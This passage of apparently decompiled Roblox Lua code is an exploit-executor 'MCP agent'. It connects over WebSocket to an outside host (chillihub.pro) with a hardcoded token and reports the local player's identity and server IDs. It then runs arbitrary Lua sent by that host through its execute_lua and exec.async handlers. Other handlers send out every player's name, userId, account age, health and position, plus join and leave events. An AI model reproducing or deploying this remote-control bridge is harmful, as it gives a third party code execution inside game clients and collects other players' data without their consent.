		local result = tbl23[v17[1]]

		if not result then
			local ok

			ok, result = pcall(function()
				return game:GetService(v17[1])
			end)

			if not (ok and result) then
				return nil, "unknown root: " .. v17[1]
			end
		end

		for i = 2, #v17 do
			local pathNotFoundAt = v17[i]

			if result == Players2 and pathNotFoundAt == "LocalPlayer" then
				result = localPlayer2
			elseif result == localPlayer2 and pathNotFoundAt == "PlayerGui" then
				result = localPlayer2:FindFirstChildOfClass("PlayerGui")
			elseif result == localPlayer2 and pathNotFoundAt == "Character" then
				result = localPlayer2.Character
			elseif result == Workspace and pathNotFoundAt == "CurrentCamera" then
				result = Workspace.CurrentCamera
			elseif typeof(result) == "Instance" then
				result = result:FindFirstChild(pathNotFoundAt)
			else
				result = nil
			end

			if not result then
				return nil, "path not found at: " .. pathNotFoundAt
			end
		end

		return result
	end
end

local tbl23, fn31

local tbl24 = {
	Archivable = true,
	Anchored = true,
	AssemblyAngularVelocity = true,
	AssemblyLinearVelocity = true,
	AutomaticSize = true,
	BackgroundColor3 = true,
	BackgroundTransparency = true,
	BrickColor = true,
	CanCollide = true,
	CanQuery = true,
	CanTouch = true,
	CanvasPosition = true,
	CanvasSize = true,
	CFrame = true,
	ClipsDescendants = true,
	Color = true,
	Enabled = true,
	FieldOfView = true,
	Health = true,
	Image = true,
	ImageColor3 = true,
	ImageTransparency = true,
	JumpPower = true,
	LayoutOrder = true,
	Material = true,
	MaxHealth = true,
	MoveDirection = true,
	Orientation = true,
	Position = true,
	RichText = true,
	Rotation = true,
	Size = true,
	Text = true,
	TextColor3 = true,
	TextSize = true,
	TextTransparency = true,
	TextWrapped = true,
	Transparency = true,
	Value = true,
	Velocity = true,
	Visible = true,
	WalkSpeed = true,
}

tbl23 = {
	"Archivable",
	"Position",
	"Size",
	"CFrame",
	"Color",
	"Transparency",
	"Visible",
	"Enabled",
	"Text",
	"Value",
	"Health",
	"MaxHealth",
}

fn31 = function(arg, arg2)
	if not tbl24[arg2] then
		return nil, "not_allowed"
	end

	local ok, result = pcall(function()
		return arg[arg2]
	end)

	if ok then
		return fn27(result)
	end
	return nil, "unavailable"
end

local fn32

fn32 = function(arg)
	return {
		name = arg.Name,
		className = arg.ClassName,
		path = fn26(arg),
		parentPath = arg.Parent and fn26(arg.Parent) or nil,
	}
end

do
	local function fn33(arg, arg2, arg3)
		local children = arg:GetChildren()
		local n18 = 1
		local n19 = 0

		while n18 <= #children and n19 < arg2 do
			local v17 = children[n18]
			n18 += 1
			n19 += 1
			if arg3(v17, n19) then
				return n19, true
			end

			if #children < arg2 then
				local children2 = v17:GetChildren()

				for _, v18 in ipairs(children2) do
					if not (arg2 <= #children) then
						table.insert(children, v18)
						continue
					end
					break
				end
			end
		end

		return n19, false
	end

	local name = "CodexMCP"

	local tbl25 = {
		Frame = true,
		TextLabel = true,
		TextButton = true,
		TextBox = true,
		ImageLabel = true,
		ImageButton = true,
		ScrollingFrame = true,
		UICorner = true,
		UIStroke = true,
		UIListLayout = true,
		UIGridLayout = true,
		UIPadding = true,
		UIAspectRatioConstraint = true,
		UISizeConstraint = true,
	}

	local tbl26 = {
		Active = true,
		AnchorPoint = true,
		AutomaticCanvasSize = true,
		AutomaticSize = true,
		BackgroundColor3 = true,
		BackgroundTransparency = true,
		BorderSizePixel = true,
		CanvasPosition = true,
		CanvasSize = true,
		ClipsDescendants = true,
		CornerRadius = true,
		DisplayOrder = true,
		Enabled = true,
		FillDirection = true,
		Font = true,
		HorizontalAlignment = true,
		Image = true,
		ImageColor3 = true,
		ImageTransparency = true,
		LayoutOrder = true,
		LineJoinMode = true,
		MaxTextSize = true,
		MinTextSize = true,
		Name = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
		Position = true,
		RichText = true,
		Rotation = true,
		ScrollBarThickness = true,
		Size = true,
		SortOrder = true,
		Text = true,
		TextColor3 = true,
		TextScaled = true,
		TextSize = true,
		TextStrokeColor3 = true,
		TextStrokeTransparency = true,
		TextTransparency = true,
		TextTruncate = true,
		TextWrapped = true,
		TextXAlignment = true,
		TextYAlignment = true,
		Thickness = true,
		Transparency = true,
		VerticalAlignment = true,
		Visible = true,
		ZIndex = true,
	}

	local tbl27 = {
		BackgroundColor3 = true,
		BorderColor3 = true,
		Color = true,
		ImageColor3 = true,
		TextColor3 = true,
		TextStrokeColor3 = true,
	}

	local tbl28 = { CanvasPosition = false, CanvasSize = true, Position = true, Size = true }
	local tbl29 = { AnchorPoint = true, CanvasPosition = true }

	local tbl30 = {
		CornerRadius = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
	}

	local tbl31 = {
		AutomaticCanvasSize = Enum.AutomaticSize,
		AutomaticSize = Enum.AutomaticSize,
		FillDirection = Enum.FillDirection,
		Font = Enum.Font,
		HorizontalAlignment = Enum.HorizontalAlignment,
		LineJoinMode = Enum.LineJoinMode,
		SortOrder = Enum.SortOrder,
		TextTruncate = Enum.TextTruncate,
		TextXAlignment = Enum.TextXAlignment,
		TextYAlignment = Enum.TextYAlignment,
		VerticalAlignment = Enum.VerticalAlignment,
	}

	local function fn34(arg)
		if type(arg) ~= "table" then
			return nil
		end
		local num = tonumber(arg[1] or arg.r)
		local num2 = tonumber(arg[2] or arg.g)
		local num3 = tonumber(arg[3] or arg.b)
		if not num or not num2 or not num3 then
			return nil
		end

		if num <= 1 and num2 <= 1 and num3 <= 1 then
			return Color3.new(num, num2, num3)
		end
		local floor = math.floor
		return Color3.fromRGB(math.floor(fn21(num, 0, 255, 0)), math.floor(fn21(num2, 0, 255, 0)), floor(fn21(num3, 0, 255, 0)))
	end

	local function fn35(arg)
		if type(arg) ~= "table" then
			return nil
		end
		return UDim2.new(tonumber(arg[1] or arg.xScale) or 0, tonumber(arg[2] or arg.xOffset) or 0, tonumber(arg[3] or arg.yScale) or 0, tonumber(arg[4] or arg.yOffset) or 0)
	end

	local function fn36(arg)
		if type(arg) ~= "table" then
			return nil
		end
		return Vector2.new(tonumber(arg[1] or arg.x) or 0, tonumber(arg[2] or arg.y) or 0)
	end

	local function fn37(arg)
		if type(arg) == "number" then
			return UDim.new(0, arg)
		end

		if type(arg) ~= "table" then
			return nil
		end
		return UDim.new(tonumber(arg[1] or arg.scale) or 0, tonumber(arg[2] or arg.offset) or 0)
	end

	local function fn38(arg, arg2)
		if tbl27[arg] then
			return fn34(arg2)
		end

		if tbl28[arg] then
			return fn35(arg2)
		end

		if tbl29[arg] then
			return fn36(arg2)
		end

		if tbl30[arg] then
			return fn37(arg2)
		end

		if tbl31[arg] then
			if typeof(arg2) == "EnumItem" then
				return arg2
			end
			return tbl31[arg][tostring(arg2):match("([^%.]+)$")]
		end

		return arg2
	end

	local function fn39(arg, arg2)
		if type(arg2) ~= "table" then
			return { applied = 0, rejected = {} }
		end
		local tbl32 = {}
		local n18 = 0

		for k, v17 in pairs(arg2) do
			if not tbl26[k] then
				table.insert(tbl32, { property = tostring(k), reason = "not_allowed" })
			else
				local v18 = fn38(k, v17)

				if v18 == nil then
					table.insert(tbl32, { property = k, reason = "invalid_value" })
				else
					local ok, result = pcall(function()
						arg[k] = v18
					end)

					if ok then
						n18 += 1
					else
						table.insert(tbl32, { property = k, reason = tostring(result) })
					end
				end
			end
		end

		return { applied = n18, rejected = tbl32 }
	end

	local function fn40()
		return localPlayer2:FindFirstChildOfClass("PlayerGui") or localPlayer2:WaitForChild("PlayerGui", 10)
	end

	local function fn41(arg)
		local v17 = fn40()
		if not v17 then
			return nil, "PlayerGui is unavailable"
		end
		local codexMCP = v17:FindFirstChild("CodexMCP")

		if not codexMCP and arg then
			codexMCP = Instance.new("ScreenGui")
			codexMCP.Name = name
			codexMCP.ResetOnSpawn = false
			codexMCP.IgnoreGuiInset = false
			codexMCP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			codexMCP.Parent = v17
		end

		return codexMCP
	end

	local function fn42(arg)
		local v17, v18 = fn41(false)
		if not v17 then
			return nil, v18 or "managed UI does not exist"
		end
		local v19 = fn20(arg)
		if v19 == "" or v19 == name then
			return v17
		end

		for match in v19:gmatch("[^%.]+") do
			if match ~= name then
				v17 = v17:FindFirstChild(match)
				if not v17 then
					return nil, "managed UI path not found: " .. match
				end
			end
		end

		return v17
	end

	local tbl32 = { Activated = true, MouseButton1Click = true, FocusLost = true }

	local function fn43(arg, arg2)
		if type(arg2) ~= "table" then
			return
		end

		for _, v17 in ipairs(arg2) do
			if tbl32[v17] then
				local ok, result = pcall(function()
					return arg[v17]
				end)

				if ok and result and type(result.Connect) == "function" then
					local connection = result:Connect(function(...)
						local tbl33 = { ... }
						fn29("ui." .. v17, { path = fn26(arg), name = arg.Name, className = arg.ClassName, arguments = fn27(tbl33) })
					end)

					table.insert(tbl22, connection)
				end
			end
		end
	end

	local fn44 = nil

	fn44 = function(arg, parent, arg2, arg3)
		if arg2 > 10 then
			error("UI tree exceeds maximum depth of 10")
		end

		if arg3.count >= 250 then
			error("UI tree exceeds maximum of 250 objects")
		end

		if type(arg) ~= "table" then
			error("UI node must be an object")
		end

		local uiClassIsNotAllowed = fn20(arg.class or arg.className)

		if not tbl25[uiClassIsNotAllowed] then
			error("UI class is not allowed: " .. uiClassIsNotAllowed)
		end

		arg3.count = arg3.count + 1
		local instance = Instance.new(uiClassIsNotAllowed)
		instance.Name = fn20(arg.name) ~= "" and fn20(arg.name):sub(1, 64) or uiClassIsNotAllowed .. arg3.count
		local v17 = fn39(instance, arg.props)
		instance.Parent = parent
		fn43(instance, arg.events)
		local children = type(arg.children) == "table" and arg.children or {}

		for _, child in ipairs(children) do
			fn44(child, instance, arg2 + 1, arg3)
		end

		return instance, v17
	end

	local fn45 = nil

	fn45 = function(arg, arg2, arg3)
		local v17 = fn32(arg)
		if arg2 >= arg3 then
			v17.truncated = #arg:GetChildren() > 0
			return v17
		end
		v17.children = {}

		for _, child in ipairs(arg:GetChildren()) do
			table.insert(v17.children, fn45(child, arg2 + 1, arg3))
		end

		return v17
	end

	local n18 = 60000
	local n19 = 80
	local tbl33 = {}

	local function fn46(...)
		local v17 = table.pack(...)
		local tbl34 = {}

		for i = 1, select("#", ...) do
			local v18 = tostring
			local value = select(i, table.unpack(v17, 1, v17.n))
			tbl34[i] = v18(value)
		end

		return table.concat(tbl34, " ")
	end

	local function fn47(arg, arg2)
		local str2 = tostring(arg or "")

		if str2:match("^%s*$") then
			error("Code is empty", 0)
		end

		local str3 = "=" .. tostring(arg2 or "WebConsole"):sub(1, 60)
		local chunk, v17 = loadstring(str2, str3)

		if not chunk then
			local chunk2 = loadstring("return " .. str2, str3)
			if chunk2 then
				return chunk2
			end
			error("Syntax error: " .. tostring(v17), 0)
		end

		return chunk
	end

	local function fn48(arg)
		local env = getfenv(0)

		local obj = setmetatable({}, {
			__index = env,
			__newindex = function(arg2, arg3, arg4)
				env[arg3] = arg4
			end,
		})

		rawset(obj, "print", function(...)
			local v17 = table.pack(...)
			arg("print", fn46(...))

			if flag4 then
				print(table.unpack(v17, 1, v17.n))
			end
		end)

		rawset(obj, "warn", function(...)
			local v17 = table.pack(...)
			arg("warn", fn46(...))

			if flag4 then
				warn(table.unpack(v17, 1, v17.n))
			end
		end)

		return obj
	end

	local function fn49(arg)
		local kind = typeof(arg)
		local ok, result = pcall(tostring, arg)

		return {
			type = kind,
			text = (ok and tostring(result) or "<unprintable>"):sub(1, 4000),
			value = kind ~= "nil" and fn27(arg) or nil,
		}
	end

	local function fn50(arg, arg2, arg3, arg4)
		local tbl34 = {}
		local tbl35 = {}

		for i = 2, arg.n do
			tbl34[i - 1] = fn27(arg[i])
			tbl35[i - 1] = fn49(arg[i])
		end

		return {
			output = table.concat(arg3, "\n"),
			outputTruncated = arg4 or nil,
			returns = tbl34,
			returnsInfo = tbl35,
			returnCount = arg.n - 1,
			elapsedMs = arg2,
		}
	end

	local function fn51(arg)
		return debug.traceback(tostring(arg), 2)
	end

	local function fn52(arg)
		if #arg.pending == 0 then
			return
		end
		local pending = arg.pending
		arg.pending = {}
		fn29("exec.output", { runId = arg.id, label = arg.label, lines = pending })
	end

	local function fn53(arg, arg2)
		local character = arg.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

		return {
			name = arg.Name,
			displayName = arg.DisplayName,
			userId = arg.UserId,
			accountAge = arg.AccountAge,
			team = arg.Team and arg.Team.Name or nil,
			neutral = arg.Neutral,
			character = character and character.Name or nil,
			health = humanoid and humanoid.Health or nil,
			maxHealth = humanoid and humanoid.MaxHealth or nil,
			position = arg2 and humanoidRootPart and fn27(humanoidRootPart.Position) or nil,
		}
	end

	local tbl34 = {
		["system.ping"] = function(arg)
			return { pong = true, echo = arg, clientTime = DateTime.now().UnixTimestampMillis }
		end,
		["game.info"] = function()
			return {
				placeId = game.PlaceId,
				gameId = game.GameId,
				jobId = game.JobId,
				placeVersion = game.PlaceVersion,
				privateServerId = game.PrivateServerId,
				privateServerOwnerId = game.PrivateServerOwnerId,
				playerCount = #Players2:GetPlayers(),
				localPlayer = { name = localPlayer2.Name, displayName = localPlayer2.DisplayName, userId = localPlayer2.UserId },
			}
		end,
		execute_lua = function(arg)
			local v17 = fn47(arg.code, arg.label)
			local tbl34 = {}
			local n20 = 0
			local flag8 = false

			local v18 = fn48(function(arg2, arg3)
				if flag8 then
					return
				end
				local str2 = (arg2 == "warn" and "[warn] " or "") .. arg3
				n20 = n20 + #str2 + 1

				if n18 < n20 then
					flag8 = true
					table.insert(tbl34, "... output truncated ...")
					return
				end

				table.insert(tbl34, str2)
			end)

			setfenv(v17, v18)
			local now = os.clock()
			local v19 = table.pack(xpcall(v17, fn51))
			local n21 = math.floor((os.clock() - now) * 1000 + 0.5)

			if not v19[1] then
				error(string.format("Runtime error: %s\n--- output ---\n%s", tostring(v19[2]), table.concat(tbl34, "\n"):sub(-20000)), 0)
			end

			return fn50(v19, n21, tbl34, flag8)
		end,
		["exec.async"] = function(arg)
			local v17 = fn47(arg.code, arg.label)
			local tbl34 = { id = HttpService2:GenerateGUID(false):sub(1, 8) }
			tbl34.label = tostring(arg.label or "Script"):sub(1, 60)
			tbl34.startedAt = os.clock()
			tbl34.pending = {}
			tbl34.lineCount = 0
			tbl34.dropped = 0

			local v18 = fn48(function(arg2, arg3)
				tbl34.lineCount = tbl34.lineCount + 1
				if #tbl34.pending >= n19 then
					tbl34.dropped = tbl34.dropped + 1
					return
				end
				table.insert(tbl34.pending, { kind = arg2, text = arg3:sub(1, 1000) })
			end)

			setfenv(v17, v18)
			tbl33[tbl34.id] = tbl34

			task.spawn(function()
				while tbl33[tbl34.id] == tbl34 do
					task.wait(0.3)

					if tbl34.dropped > 0 then
						table.insert(tbl34.pending, { kind = "warn", text = string.format("... %d line(s) skipped ...", tbl34.dropped) })
						tbl34.dropped = 0
					end

					fn52(tbl34)
				end
			end)

			tbl34.thread = task.defer(function()
				local v19 = table.pack(xpcall(v17, fn51))
				if tbl33[tbl34.id] ~= tbl34 then
					return
				end
				tbl33[tbl34.id] = nil
				fn52(tbl34)
				local startedAt = tbl34.startedAt
				local n20 = math.floor((os.clock() - startedAt) * 1000 + 0.5)
				local tbl35 = { runId = tbl34.id, label = tbl34.label, ok = v19[1] == true, elapsedMs = n20 }

				if v19[1] then
					local v20 = fn50(v19, n20, {}, false)
					tbl35.returnsInfo = v20.returnsInfo
					tbl35.returnCount = v20.returnCount
				else
					tbl35.error = tostring(v19[2]):sub(1, 4000)
				end

				fn29("exec.finished", tbl35)
			end)

			return { runId = tbl34.id, label = tbl34.label }
		end,
		["exec.cancel"] = function(arg)
			local v17 = tbl33[tostring(arg.runId or "")]
			if not v17 then
				return { cancelled = false, reason = "not running" }
			end
			tbl33[v17.id] = nil
			pcall(task.cancel, v17.thread)
			fn52(v17)
			local startedAt = v17.startedAt

			fn29("exec.finished", {
				runId = v17.id,
				label = v17.label,
				ok = false,
				cancelled = true,
				error = "Cancelled from the web console",
				elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
			})

			return { cancelled = true, runId = v17.id }
		end,
		["exec.list"] = function()
			local tbl34 = {}

			for k, v17 in pairs(tbl33) do
				local startedAt = v17.startedAt

				table.insert(tbl34, {
					runId = k,
					label = v17.label,
					lines = v17.lineCount,
					elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
				})
			end

			return { count = #tbl34, runs = tbl34 }
		end,
		["console.tail"] = function(arg)
			local logHistory = game:GetService("LogService"):GetLogHistory()
			local v17 = fn21(arg.limit, 1, 500, 200)
			local n20 = tonumber(arg.since) or 0
			local tbl34 = {}

			for i = #logHistory, 1, -1 do
				local v18 = logHistory[i]

				if not (v18.timestamp <= n20 or #tbl34 >= v17) then
					table.insert(tbl34, 1, {
						message = tostring(v18.message):sub(1, 1000),
						kind = v18.messageType.Name,
						time = v18.timestamp,
					})

					continue
				end

				break
			end

			return { count = #tbl34, entries = tbl34, latest = logHistory[#logHistory] and logHistory[#logHistory].timestamp or n20 }
		end,
		["players.list"] = function(arg)
			local tbl34 = {}
			local flag8 = arg.includePosition ~= false

			for _, player in ipairs(Players2:GetPlayers()) do
				table.insert(tbl34, fn53(player, flag8))
			end

			table.sort(tbl34, function(arg2, arg3)
				return string.lower(arg2.name) < string.lower(arg3.name)
			end)

			return { count = #tbl34, players = tbl34 }
		end,
		["players.get"] = function(arg)
			local query = arg.query
			local num = tonumber(query)
			local v17 = string.lower(fn20(query))

			for _, player in ipairs(Players2:GetPlayers()) do
				if num and player.UserId == num or string.lower(player.Name) == v17 or string.lower(player.DisplayName) == v17 then
					return fn53(player, true)
				end
			end

			error("player not found: " .. tostring(query))
		end,
		["characters.list"] = function()
			local tbl34 = {}

			for _, player in ipairs(Players2:GetPlayers()) do
				local character = player.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

				table.insert(tbl34, {
					player = player.Name,
					userId = player.UserId,
					characterPath = character and fn26(character) or nil,
					health = humanoid and humanoid.Health or nil,
					maxHealth = humanoid and humanoid.MaxHealth or nil,
					walkSpeed = humanoid and humanoid.WalkSpeed or nil,
					jumpPower = humanoid and humanoid.JumpPower or nil,
					moveDirection = humanoid and fn27(humanoid.MoveDirection) or nil,
					state = humanoid and tostring(humanoid:GetState()) or nil,
					position = humanoidRootPart and fn27(humanoidRootPart.Position) or nil,
					velocity = humanoidRootPart and fn27(humanoidRootPart.AssemblyLinearVelocity) or nil,
				})
			end

			return { count = #tbl34, characters = tbl34 }
		end,
		["workspace.summary"] = function(arg)
			local n20 = math.floor(fn21(arg.maxDescendants, 1, 5000, 2000))
			local tbl34 = {}
			local tbl35 = {}

			for _, child in ipairs(Workspace:GetChildren()) do
				table.insert(tbl35, fn32(child))
			end

			local v17 = fn33(Workspace, n20, function(arg2)
				tbl34[arg2.ClassName] = (tbl34[arg2.ClassName] or 0) + 1
				return false
			end)

			return {
				topLevel = tbl35,
				topLevelCount = #tbl35,
				scannedDescendants = v17,
				truncated = v17 >= n20,
				classCounts = tbl34,
			}
		end,
		["instance.find"] = function(arg)
			local v17, v18 = fn30(arg.root or "Workspace")

			if not v17 then
				error(v18)
			end

			local v19 = string.lower(fn20(arg.nameContains))
			local v20 = fn20(arg.className)
			local n20 = math.floor(fn21(arg.limit, 1, 200, 50))
			local tbl34 = {}

			local v21 = fn33(v17, math.floor(fn21(arg.scanLimit, 1, 10000, 3000)), function(arg2)
				local flag8 = v19 == "" or string.find(string.lower(arg2.Name), v19, 1, true) ~= nil
				local flag9 = false

				if v20 ~= "" and arg2.ClassName ~= v20 then
					pcall(function()
						flag9 = arg2:IsA(v20)
					end)
				end

				if flag8 and (v20 == "" or arg2.ClassName == v20 or flag9) then
					table.insert(tbl34, fn32(arg2))
				end

				return #tbl34 >= n20
			end)

			return { root = fn26(v17), scanned = v21, count = #tbl34, matches = tbl34 }
		end,
		["instance.children"] = function(arg)
			local v17, v18 = fn30(arg.path)

			if not v17 then
				error(v18)
			end

			local n20 = math.floor(fn21(arg.limit, 1, 500, 100))
			local children = v17:GetChildren()
			local tbl34 = {}

			for i = 1, math.min(#children, n20) do
				table.insert(tbl34, fn32(children[i]))
			end

			return { parent = fn32(v17), total = #children, returned = #tbl34, children = tbl34 }
		end,
		["instance.inspect"] = function(arg)
			local v17, v18 = fn30(arg.path)

			if not v17 then
				error(v18)
			end

			local tbl34 = {}

			for _, v19 in ipairs(tbl23) do
				tbl34[v19] = true
			end

			if type(arg.properties) == "table" then
				for _, property in ipairs(arg.properties) do
					tbl34[tostring(property)] = true
				end
			end

			local tbl35 = {}
			local tbl36 = {}

			for k in pairs(tbl34) do
				local v19, v20 = fn31(v17, k)

				if v20 then
					tbl36[k] = v20
				else
					tbl35[k] = v19
				end
			end

			return {
				instance = fn32(v17),
				attributes = fn27(v17:GetAttributes()),
				tags = fn27(v17:GetTags()),
				childCount = #v17:GetChildren(),
				properties = tbl35,
				unavailable = tbl36,
			}
		end,
		["instance.attributes"] = function(arg)
			local v17, v18 = fn30(arg.path)

			if not v17 then
				error(v18)
			end

			return { instance = fn32(v17), attributes = fn27(v17:GetAttributes()) }
		end,
		["camera.get"] = function()
			local currentCamera = Workspace.CurrentCamera

			if not currentCamera then
				error("CurrentCamera is unavailable")
			end

			return {
				path = fn26(currentCamera),
				cameraType = tostring(currentCamera.CameraType),
				fieldOfView = currentCamera.FieldOfView,
				viewportSize = fn27(currentCamera.ViewportSize),
				cframe = fn27(currentCamera.CFrame),
				focus = fn27(currentCamera.Focus),
				subject = fn27(currentCamera.CameraSubject),
			}
		end,
		["telemetry.snapshot"] = function()
			local result = RunService2.RenderStepped:Wait()
			local totalMemoryUsageMb = nil

			pcall(function()
				totalMemoryUsageMb = game:GetService("Stats"):GetTotalMemoryUsageMb()
			end)

			return {
				fpsEstimate = result > 0 and math.floor(1 / result + 0.5) or nil,
				frameDeltaMs = result * 1000,
				memoryMb = totalMemoryUsageMb,
				playerCount = #Players2:GetPlayers(),
				placeId = game.PlaceId,
				jobId = game.JobId,
				distributedGameTime = Workspace.DistributedGameTime,
				timestamp = DateTime.now().UnixTimestampMillis,
			}
		end,
		["ui.create"] = function(arg)
			local v17, v18 = fn41(true)

			if not v17 then
				error(v18)
			end

			if arg.replace ~= false then
				fn22(tbl22)

				for _, child in ipairs(v17:GetChildren()) do
					child:Destroy()
				end
			end

			local tbl34 = { count = 0 }
			local v19, v20 = fn44(arg.tree, v17, 1, tbl34)
			return { created = fn32(v19), objectCount = tbl34.count, propertyResult = v20 }
		end,
		["ui.update"] = function(arg)
			local v17, v18 = fn42(arg.path)

			if not v17 then
				error(v18)
			end

			return { instance = fn32(v17), result = fn39(v17, arg.props) }
		end,
		["ui.delete"] = function(arg)
			local v17 = fn20(arg.path)
			local v18, v19 = fn42(v17)

			if not v18 then
				if v17 == "" then
					return { deleted = false, reason = "managed UI does not exist" }
				end
				error(v19)
			end

			fn22(tbl22)
			local v20 = fn26(v18)
			v18:Destroy()
			return { deleted = true, path = v20 }
		end,
		["ui.list"] = function(arg)
			local v17, v18 = fn41(false)
			if not v17 then
				return { exists = false, reason = v18 or "managed UI does not exist" }
			end
			local n20 = math.floor(fn21(arg.maxDepth, 1, 10, 6))
			return { exists = true, tree = fn45(v17, 0, n20) }
		end,
		["ui.notify"] = function(arg)
			local v17, v18 = fn41(true)

			if not v17 then
				error(v18)
			end

			local notifications = v17:FindFirstChild("Notifications")

			if not notifications then
				notifications = Instance.new("Frame")
				notifications.Name = "Notifications"
				notifications.AnchorPoint = Vector2.new(1, 0)
				notifications.Position = UDim2.new(1, -16, 0, 16)
				notifications.Size = UDim2.fromOffset(360, 500)
				notifications.BackgroundTransparency = 1
				notifications.Parent = v17
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.Padding = UDim.new(0, 8)
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Parent = notifications
			end

			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "Notification_" .. HttpService2:GenerateGUID(false)
			textLabel.Size = UDim2.fromOffset(340, 64)
			textLabel.BackgroundColor3 = fn34(arg.color) or Color3.fromRGB(25, 35, 52)
			textLabel.BackgroundTransparency = 0.08
			textLabel.Text = tostring(arg.text):sub(1, 500)
			textLabel.TextColor3 = Color3.fromRGB(240, 247, 255)
			textLabel.TextSize = 16
			textLabel.Font = Enum.Font.GothamSemibold
			textLabel.TextWrapped = true
			textLabel.Parent = notifications
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(0, 10)
			uiCorner.Parent = textLabel
			local v19 = fn21(arg.duration, 0.5, 30, 4)

			task.delay(v19, function()
				if textLabel.Parent then
					textLabel:Destroy()
				end
			end)

			return { shown = true, name = textLabel.Name, duration = v19 }
		end,
	}

	local function fn54(arg)
		local str2 = tostring(arg.requestId or "")
		local unknownOrDisallowedMethod = tostring(arg.method or "")
		local v17 = tbl34[unknownOrDisallowedMethod]
		if str2 == "" then
			return
		end

		if not v17 then
			fn28({
				type = "rpc_result",
				requestId = str2,
				success = false,
				error = "Unknown or disallowed method: " .. unknownOrDisallowedMethod,
			})

			return
		end

		task.spawn(function()
			local ok, result = xpcall(function()
				return v17(type(arg.params) == "table" and arg.params or {})
			end, function(arg2)
				return debug.traceback(tostring(arg2), 2)
			end)

			if ok then
				fn28({ type = "rpc_result", requestId = str2, success = true, data = fn27(result) })
			else
				fn28({ type = "rpc_result", requestId = str2, success = false, error = tostring(result):sub(1, 2000) })
			end
		end)
	end

	local function fn55(arg)
		local ok, result = pcall(function()
			return HttpService2:JSONDecode(tostring(arg))
		end)

		if not ok or type(result) ~= "table" then
			fn19("Invalid JSON message")
			return
		end

		if result.type == "identify_ok" then
			fn18("Connected to bridge. Client ID:", tostring(result.clientId))
			local tbl35 = {}

			for k in pairs(tbl34) do
				table.insert(tbl35, k)
			end

			table.sort(tbl35)
			fn29("agent.ready", { clientId = result.clientId, methods = tbl35, playerCount = #Players2:GetPlayers() })
			return
		end

		if result.type == "pong" then
			fn18("PONG", tostring(result.seq or ""))
			return
		end

		if result.type == "rpc_request" then
			fn54(result)
			return
		end

		if result.type == "identify_error" then
			fn19("Bridge rejected identity:", tostring(result.error))
		end
	end

	local function fn56()
		flag7 = false
		fn22(tbl21)
		if not v16 then
			return
		end

		pcall(function()
			if type(v16.Close) == "function" then
				v16:Close()
			elseif type(v16.close) == "function" then
				v16:close()
			end
		end)

		v16 = nil
	end

	local function fn57()
		local v17, v18 = fn23()
		if not v17 then
			fn19("No supported WebSocket API found")
			return false
		end
		n15 += 1
		local v19 = n15
		fn18("Connecting to", "wss://chillihub.pro/roblox-mcp?token=skyb0y-ws-2025", "using", v18)

		local ok, result = pcall(function()
			return v17("wss://chillihub.pro/roblox-mcp?token=skyb0y-ws-2025")
		end)

		if not ok or not result then
			fn19("Connection failed:", tostring(result))
			return false
		end
		v16 = result
		flag7 = true
		n16 = n14
		local onMessage = fn24(v16, "OnMessage", "MessageReceived")
		local onClose = fn24(v16, "OnClose", "Closed", "OnDisconnect")
		local onError = fn24(v16, "OnError", "Error")

		local v20 = fn25(onMessage, function(arg)
			if v19 == n15 then
				fn55(arg)
			end
		end)

		if v20 then
			table.insert(tbl21, v20)

			local v21 = fn25(onClose, function(...)
				if v19 == n15 then
					flag7 = false
					fn19("Socket closed", ...)
				end
			end)

			if v21 then
				table.insert(tbl21, v21)
			end

			local v22 = fn25(onError, function(...)
				if v19 == n15 then
					fn19("Socket error", ...)
					flag7 = false
				end
			end)

			if v22 then
				table.insert(tbl21, v22)
			end

			local v23, v24 = fn28({
				type = "identify",
				clientType = "roblox",
				token = str,
				name = localPlayer2.Name,
				displayName = localPlayer2.DisplayName,
				userId = localPlayer2.UserId,
				placeId = game.PlaceId,
				jobId = game.JobId,
			})

			if not v23 then
				fn19(v24)
				flag7 = false
			end

			task.spawn(function()
				while flag6 and flag7 and v19 == n15 do
					task.wait(20)

					if flag6 and flag7 and v19 == n15 then
						n17 += 1
						local v25, v26 = fn28({ type = "ping", seq = n17 })

						if not v25 then
							fn19("Heartbeat failed:", tostring(v26))
							flag7 = false
						end
					end
				end
			end)

			while flag6 and flag7 and v19 == n15 do
				task.wait(0.5)
			end

			if v19 == n15 then
				fn56()
			end

			return true
		end

		fn19("Socket has no supported message event")
		fn56()
		return false
	end

	table.insert(tbl20, Players2.PlayerAdded:Connect(function(player)
		if flag5 then
			fn29("player.added", fn53(player, true))
		end
	end))

	table.insert(tbl20, Players2.PlayerRemoving:Connect(function(player)
		if flag5 then
			fn29("player.removing", fn53(player, true))
		end
	end))

	genv.StopRobloxMCPAgent = function()
		if not flag6 then
			return
		end
		fn18("Stopping agent")
		flag6 = false
		n15 += 1
		fn22(tbl20)
		fn22(tbl22)
		fn56()
	end

	task.spawn(function()
		while flag6 do
			local v17 = fn57()

			if flag6 then
				if v17 then
					n16 = n14
				end

				fn19(string.format("Reconnecting in %d seconds", n16))
				task.wait(n16)
				n16 = math.min(n16 * 2, 30)
				continue
			end

			break
		end

		fn18("Agent stopped")
	end)
end

fn18("Agent initialized with", tostring(#Players2:GetPlayers()), "player(s)")
